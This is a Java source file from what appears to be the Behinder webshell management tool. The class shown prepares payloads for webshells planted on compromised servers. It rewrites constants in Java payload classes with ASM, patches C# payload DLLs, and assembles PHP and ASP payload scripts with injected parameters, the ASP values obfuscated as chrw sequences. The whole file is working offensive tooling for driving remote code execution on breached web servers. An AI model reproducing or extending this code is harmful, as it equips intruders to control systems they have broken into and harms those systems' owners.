package net.rebeyond.behinder.core;

import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.util.Arrays;
import java.util.Map;
import net.rebeyond.behinder.utils.ReplacingInputStream;
import net.rebeyond.behinder.utils.Utils;
import org.objectweb.asm.ClassReader;
import org.objectweb.asm.ClassVisitor;
import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.FieldVisitor;

public class Params
{
    public static byte[] getParamedClass(String clsName, final Map<String, String> params) throws Exception {
        String clsPath = String.format("net/rebeyond/behinder/payload/java/%s.class", new Object[] { clsName });
        
        ClassReader classReader = new ClassReader(String.format("net.rebeyond.behinder.payload.java.%s", new Object[] { clsName }));
        ClassWriter cw = new ClassWriter(1);

        classReader.accept(new ClassVisitor(589824, cw) {
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (params.containsKey(filedName)) {
                    String paramValue = params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
                } else {
                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                }
            }
        }, 0);
        byte[] result = cw.toByteArray();
        result[7] = 50;
        
        return result;
    }

    public static byte[] getParamedClassForPlugin(String payloadPath, final Map<String, String> params) throws Exception {
        ClassReader classReader = new ClassReader(Utils.getFileData(payloadPath));
        ClassWriter cw = new ClassWriter(1);
        classReader.accept(new ClassVisitor(589824, cw) {
            public FieldVisitor visitField(int arg0, String filedName, String arg2, String arg3, Object arg4) {
                if (params.containsKey(filedName)) {
                    String paramValue = params.get(filedName);
                    return super.visitField(arg0, filedName, arg2, arg3, paramValue);
                } else {
                    return super.visitField(arg0, filedName, arg2, arg3, arg4);
                }
            }
        }, 0);
        byte[] result = cw.toByteArray();
        return result;
    }
    
    public static byte[] getParamedAssembly(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/csharp/";
        String payloadPath = basePath + clsName + ".dll";
        byte[] result = Utils.getResourceData(payloadPath);
        if (params.keySet().size() == 0) {
            return result;
        }

        
        String paramsStr = "";
        for (String paramName : params.keySet()) {
            
            String paramValue = Base64.encode(((String)params.get(paramName)).toString().getBytes());
            paramsStr = paramsStr + paramName + ":" + paramValue + ",";
        } 
        paramsStr = paramsStr.substring(0, paramsStr.length() - 1);
        String token = "~~~~~~" + paramsStr;
        
        return Utils.mergeBytes(result, token.getBytes());
    }
    
    public static byte[] getParamedAssemblyClassic(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/csharp/";
        String payloadPath = basePath + clsName + ".dll";
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        for (String paraName : params.keySet()) {
            String paraValue = params.get(paraName);
            StringBuilder searchStr = new StringBuilder();
            while (searchStr.length() < paraValue.length())
            {
                searchStr.append(paraName);
            }
            byte[] search = Utils.ascii2unicode("~" + searchStr.substring(0, paraValue.length()), 0);
            byte[] replacement = Utils.ascii2unicode(paraValue, 1);
            ReplacingInputStream replacingInputStream = new ReplacingInputStream(bis, search, replacement);
            int b;
            while (-1 != (b = replacingInputStream.read()))
                bos.write(b); 
            replacingInputStream.close();
        } 
        return bos.toByteArray();
    }

    public static byte[] getParamedPhp(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/php/";
        String payloadPath = basePath + clsName + ".php";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int b;
        while (-1 != (b = bis.read()))
            bos.write(b); 
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        for (String paraName : params.keySet()) {
            
            String paraValue = params.get(paraName);
            
            code.append(String.format("$%s=\"%s\";", new Object[] { paraName, paraValue }));
            paraList = paraList + ",$" + paraName;
        } 
        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain(" + paraList + ");");
        return code.toString().getBytes();
    }

    public static byte[] getParamedAsp(String clsName, Map<String, String> params) throws Exception {
        String basePath = "net/rebeyond/behinder/payload/asp/";
        String payloadPath = basePath + clsName + ".asp";
        StringBuilder code = new StringBuilder();
        ByteArrayInputStream bis = new ByteArrayInputStream(Utils.getResourceData(payloadPath));
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        int b;
        while (-1 != (b = bis.read()))
            bos.write(b); 
        bis.close();
        code.append(bos.toString());
        String paraList = "";
        if (params.size() > 0) {
            
            paraList = paraList + "Array(";
            for (String paraName : params.keySet()) {
                String paraValue = params.get(paraName);
                String paraValueEncoded = "";
                for (int i = 0; i < paraValue.length(); i++)
                {
                    paraValueEncoded = paraValueEncoded + "&chrw(" + paraValue.charAt(i) + ")";
                }
                paraValueEncoded = paraValueEncoded.replaceFirst("&", "");

                
                paraList = paraList + "," + paraValueEncoded;
            } 
            paraList = paraList + ")";
        } 

        paraList = paraList.replaceFirst(",", "");
        code.append("\r\nmain " + paraList + "");
        return code.toString().getBytes();
    }
}